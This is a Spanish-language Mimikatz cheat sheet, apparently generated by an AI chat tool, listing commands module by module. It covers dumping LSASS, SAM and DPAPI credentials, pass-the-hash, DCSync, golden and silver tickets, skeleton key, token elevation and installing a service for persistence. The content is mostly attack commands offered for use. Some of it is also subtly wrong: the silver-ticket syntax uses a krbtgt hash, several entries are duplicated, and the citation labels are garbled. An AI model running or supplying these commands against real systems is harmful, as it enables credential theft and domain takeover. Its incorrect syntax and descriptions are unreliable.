### 🔐 **Módulo `sekurlsa`** – Extracción de credenciales en memoria

Este módulo permite acceder a credenciales almacenadas en la memoria del proceso LSASS:​

- `sekurlsa::logonpasswords` – Muestra contraseñas en texto claro, hashes NTLM y tickets Kerberos.

- `sekurlsa::logonPasswords full` – Muestra información detallada de las credenciales.

- `sekurlsa::tickets /export` – Exporta tickets Kerberos de la memoria.

- `sekurlsa::pth /user:usuario /domain:dominio /ntlm:hash /run:comando` – Realiza un ataque Pass-the-Hash.

- `sekurlsa::msv` – Muestra credenciales LM y NTLM.

- `sekurlsa::kerberos` – Muestra credenciales Kerberos.

- `sekurlsa::ekeys` – Muestra claves de encriptación Kerberos.

- `sekurlsa::dpapi` – Muestra claves de protección de datos (DPAPI).

- `sekurlsa::liveSSP` – Muestra credenciales LiveSSP.

- `sekurlsa::minidump archivo.dmp` – Carga un volcado de memoria de LSASS.

- `sekurlsa::credman` – Muestra credenciales del Administrador de Credenciales.

- `sekurlsa::vault` – Muestra credenciales del Almacén de Credenciales.​[Tech Brunch+5WWT+5Peco602+5](https://www.wwt.com/api-new/attachments/66a7b8da13599902a3aa53a9/file?utm_source=chatgpt.com)[Scribd+1Medium+1](https://www.scribd.com/document/790703077/Mimikatz-Cheat-Sheet?utm_source=chatgpt.com)[Tech Brunch+2Red Canary+2Scribd+2](https://redcanary.com/threat-detection-report/threats/mimikatz/?utm_source=chatgpt.com)[Peco602](https://www.peco602.com/post/0030-mimikatz-cheatsheet/?utm_source=chatgpt.com)


---

### 🛡️ **Módulo `lsadump`** – Extracción de credenciales de LSA y SAM

Este módulo interactúa con la Autoridad Local de Seguridad (LSA) y la base de datos SAM:​

- `lsadump::sam` – Extrae hashes de contraseñas del SAM.

- `lsadump::secrets` – Extrae secretos almacenados en el registro de Windows.

- `lsadump::cache` – Extrae credenciales de inicio de sesión en caché.

- `lsadump::changentlm` – Cambia el hash NTLM de una cuenta.

- `lsadump::setntlm` – Establece un nuevo hash NTLM para una cuenta.

- `lsadump::lsa` – Extrae credenciales de la memoria de LSASS.

- `lsadump::netsync` – Sincroniza credenciales con un controlador de dominio.

- `lsadump::dcsync` – Simula la replicación de un controlador de dominio para obtener hashes de contraseñas.

- `lsadump::dcshadow` – Realiza cambios en el controlador de dominio sin replicación.

- `lsadump::trust` – Extrae información de relaciones de confianza entre dominios.

- `lsadump::backupkeys` – Extrae claves de cifrado de la base de datos de Active Directory.​[Scribd](https://www.scribd.com/document/790703077/Mimikatz-Cheat-Sheet?utm_source=chatgpt.com)[Introduction | The Hacker Tools+1Scribd+1](https://tools.thehacker.recipes/mimikatz/modules?utm_source=chatgpt.com)


---

### 🔑 **Módulo `kerberos`** – Manipulación de tickets Kerberos

Este módulo permite interactuar con el sistema de autenticación Kerberos:​

- `kerberos::list` – Lista todos los tickets Kerberos en memoria.

- `kerberos::ptt archivo.kirbi` – Inyecta un ticket Kerberos en la sesión actual.

- `kerberos::golden /domain:dominio /sid:SID /krbtgt:hash /user:usuario /id:RID /ptt` – Crea y pasa un Golden Ticket.

- `kerberos::silver /domain:dominio /sid:SID /krbtgt:hash /user:usuario /id:RID /ptt` – Crea y pasa un Silver Ticket.

- `kerberos::trust /domain:dominio /sid:SID /krbtgt:hash /user:usuario /id:RID /ptt` – Crea y pasa un Trust Ticket.

- `kerberos::ask /domain:dominio /user:usuario /rc4:hash` – Solicita un TGS para un servicio específico.

- `kerberos::purge` – Elimina todos los tickets Kerberos en memoria.

- `kerberos::clist` – Lista tickets en caché de MIT/Heimdall.

- `kerberos::tgt` – Obtiene el TGT actual del usuario.

- `kerberos::hash` – Convierte una contraseña en un hash RC4.​[Tech Brunch+1Adsecurity+1](https://techbrunch.github.io/patt-mkdocs/Methodology%20and%20Resources/Windows%20-%20Mimikatz/?utm_source=chatgpt.com)[Red Canary+3Swissky's InfoSec Adventures+3Medium+3](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/?utm_source=chatgpt.com)[Tech Brunch+3Peco602+3Medium+3](https://www.peco602.com/post/0030-mimikatz-cheatsheet/?utm_source=chatgpt.com)[Scribd](https://www.scribd.com/document/790703077/Mimikatz-Cheat-Sheet?utm_source=chatgpt.com)


---

### 🛠️ **Módulo `crypto`** – Manipulación de certificados y claves criptográficas

Este módulo permite interactuar con la infraestructura criptográfica de Windows:​

- `crypto::certificates` – Lista o exporta certificados.

- `crypto::cng` – Parchea el servicio CNG para facilitar la exportación de claves.

- `crypto::capi` – Parchea la capa CryptoAPI para facilitar la exportación de claves.

- `crypto::hash` – Calcula el hash de una contraseña con un nombre de usuario opcional.

- `crypto::keys` – Lista o exporta contenedores de claves.

- `crypto::extract` – Extrae claves de proveedores RSA/AES de CAPI.

- `crypto::sc` – Lista lectores de tarjetas inteligentes.

- `crypto::scauth` – Crea un certificado de autenticación desde una CA.

- `crypto::system` – Define un archivo de certificado del sistema Windows.

- `crypto::providers` – Lista proveedores criptográficos.

- `crypto::stores` – Lista almacenes criptográficos.

- `crypto::cng` – Parchea el servicio CNG para facilitar la exportación de claves.​[Threat Hunter Playbook+3Scribd+3Swissky's InfoSec Adventures+3](https://www.scribd.com/document/790703077/Mimikatz-Cheat-Sheet?utm_source=chatgpt.com)


---

### 🧪 **Módulo `dpapi`** – Protección de datos y claves

Este módulo permite interactuar con la API de protección de datos de Windows:​

- `dpapi::blob` – Desencripta un blob DPAPI con una clave maestra o una API.

- `dpapi::cred` – Muestra credenciales almacenadas por DPAPI.

- `dpapi::credhist` – Muestra el historial de credenciales de DPAPI.

- `dpapi::capi` – Prueba claves CAPI.

- `dpapi::cng` – Prueba claves CNG.

- `dpapi::chrome` – Extrae contraseñas de Google Chrome.

- `dpapi::cache` – Crea un caché de claves.

- `dpapi::credhist` – Muestra el historial de credenciales.

- `dpapi::cng` – Prueba claves CNG.​[Scribd](https://www.scribd.com/document/790703077/Mimikatz-Cheat-Sheet?utm_source=chatgpt.com)


---

### 🧩 **Módulo `misc`** – Funciones diversas

Este módulo incluye comandos que no encajan en otras categorías:​[Cheatography](https://cheatography.com/wbtaylor/cheat-sheets/basic-mimikatz-usage/?utm_source=chatgpt.com)

- `misc::cmd` – Ejecuta un comando en una nueva consola.

- `misc::memssp` – Manipula el protocolo de seguridad de memoria.

- `misc::skeleton` – Crea una clave maestra de autenticación.

- `misc::addsid` – Agrega un SID a un token.

- `misc::patch` – Parchea un proceso en ejecución.​[Medium](https://happycamper84.medium.com/mimikatz-cheatsheet-ad2b88059b4?utm_source=chatgpt.com)[Tech Brunch](https://techbrunch.github.io/patt-mkdocs/Methodology%20and%20Resources/Windows%20-%20Mimikatz/?utm_source=chatgpt.com)


---

### 🧪 **Módulo `token`** – Manipulación de tokens de seguridad

Este módulo permite interactuar con los tokens de seguridad de Windows:​

- `token::list` – Lista todos los tokens del sistema.

- `token::elevate` – Eleva el token actual a SYSTEM.

- `token::run` – Ejecuta un comando con un token específico.

- `token::impersonate` – Suplanta un token específico.

- `token::revert` – Revierte a un token anterior.
    
- `token::dup` – Duplica un token.​[Cheatography+4Tech Brunch+4Threat Hunter Playbook+4](https://techbrunch.github.io/patt-mkdocs/Methodology%20and%20Resources/Windows%20-%20Mimikatz/?utm_source=chatgpt.com)[Threat Hunter Playbook](https://threathunterplaybook.com/library/windows/mimikatz_openprocess_modules.html?utm_source=chatgpt.com)


---

### 🛠️ **Módulo `service`** – Interacción con servicios de Windows

Este módulo ofrece comandos para gestionar y manipular servicios en sistemas Windows:​

- **`SERVICE::+`**: Instala el servicio Mimikatz (`mimikatzsvc`) en el sistema.

- **`SERVICE::-`**: Desinstala el servicio Mimikatz (`mimikatzsvc`) del sistema.

- **`SERVICE::List`**: Lista todos los servicios instalados en el sistema.

- **`SERVICE::Me`**: Muestra información sobre el servicio Mimikatz en ejecución.

- **`SERVICE::Preshutdown`**: Inicia el servicio Mimikatz en modo pre-apagado.

- **`SERVICE::Remove`**: Elimina el servicio Mimikatz del sistema.

- **`SERVICE::Resume`**: Reanuda la ejecución de un servicio suspendido.

- **`SERVICE::Shutdown`**: Detiene el servicio Mimikatz.

- **`SERVICE::Start`**: Inicia el servicio Mimikatz.

- **`SERVICE::Stop`**: Detiene el servicio Mimikatz.

- **`SERVICE::Suspend`**: Suspende la ejecución del servicio Mimikatz.​[Adsecurity](https://adsecurity.org/?page_id=1821&utm_source=chatgpt.com)[Liquid Web+8Medium+8Informa TechTarget+8](https://harshdushyants.medium.com/mimikatz-b3c5fd9f97b9?utm_source=chatgpt.com)


Estos comandos permiten a los usuarios gestionar el servicio Mimikatz en el sistema, lo que puede ser útil para mantener la persistencia o realizar tareas de administración remota.